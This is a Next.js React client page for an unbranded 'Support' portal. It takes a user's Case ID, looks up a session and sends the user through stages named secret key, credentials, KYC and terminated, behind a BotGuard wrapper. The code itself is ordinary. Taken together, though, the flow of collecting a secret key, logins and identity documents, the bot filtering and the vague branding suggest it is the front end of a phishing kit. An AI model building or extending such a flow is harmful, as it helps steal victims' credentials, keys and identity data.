'use client';

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your Case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate Case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate Case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate Case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="login-title">Support</h1>

        <form className="login-form" onSubmit={handleSubmit} noValidate>
          <div className={`form-field-wrapper ${fieldError ? 'has-error' : ''}`}>
            <label htmlFor="case-id" className="form-label">Case ID</label>
            <input
              type="text"
              id="case-id"
              name="case-id"
              className="form-input"
              autoComplete="off"
              value={caseId}
              onChange={(e) => {
                setCaseId(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isLoading}
              required
            />
          </div>

          {fieldError && (
            <div className="field-error-message">
              <span>{fieldError}</span>
            </div>
          )}

          <button
            type="submit"
            className="btn-primary"
            disabled={isLoading}
          >
            {isLoading ? 'Verifying...' : 'Submit'}
          </button>

          <a href="#" className="help-link">I need help logging on</a>
        </form>
      </div>
    </BotGuard>
  );
}
